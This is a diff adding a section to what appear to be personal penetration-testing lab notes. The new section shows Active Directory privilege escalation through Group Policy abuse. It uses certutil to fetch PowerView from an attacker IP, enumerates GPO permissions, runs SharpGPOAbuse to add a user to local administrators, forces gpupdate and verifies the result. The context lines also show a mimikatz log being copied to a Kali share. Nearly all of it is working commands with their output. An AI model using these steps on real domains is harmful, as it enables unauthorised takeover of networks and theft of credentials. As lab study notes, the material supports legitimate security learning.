@@ -22,6 +22,75 @@ net use m: \\Kali_IP\test /user:kourosh kourosh
 copy mimikatz.log m:\
 ```
 
+## Elevating to Administrator - No idea if this is necessary
+- With [SharpGPOAbuse.exe](https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7)
+```powershell
+certutil.exe -urlcache -f http://192.168.45.224:8080/PowerView.ps1 PowerView.ps1
+Import-Module .\PowerView.ps1
+
+# Get list of all GPOs
+Get-NetGPO | select displayname
+	displayname
+	-----------
+	Default Domain Policy
+	Default Domain Controllers Policy
+
+
+# Get ID
+Get-GPO -Name "Default Domain Policy"
+	DisplayName      : Default Domain Policy
+	DomainName       : secura.yzx
+	Owner            : SECURA\Domain Admins
+	Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
+	GpoStatus        : AllSettingsEnabled
+	Description      :
+	CreationTime     : 8/5/2022 6:20:58 PM
+	ModificationTime : 10/25/2022 5:39:34 PM
+	UserVersion      : AD Version: 3, SysVol Version: 3
+	ComputerVersion  : AD Version: 70, SysVol Version: 70
+
+
+# Check user's perms (NOTE: 'Edit')
+Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
+	Trustee     : charlotte
+	TrusteeType : User
+	Permission  : GpoEditDeleteModifySecurity
+	Inherited   : False
+
+
+# Add user to Admin group
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
+	[+] Domain = secura.yzx
+	[+] Domain Controller = dc01.secura.yzx
+	[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
+	[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
+	[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+	[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+	[+] The GPO does not specify any group memberships.
+	[+] versionNumber attribute changed successfully
+	[+] The version number in GPT.ini was increased successfully.
+	[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+	[+] Done!
+
+
+# Force update new policy settings
+gpupdate /force
+	Updating policy...
+	Computer Policy update has completed successfully.
+	User Policy update has completed successfully.
+
+
+# Verify
+net localgroup administrators
+	Alias name     administrators
+	Comment        Administrators have complete and unrestricted access to the computer/domain
+	Members
+	-------------------------------------------------------------------------------
+	Administrator
+	charlotte
+	The command completed successfully.
+```
+
 
 # VMs
 
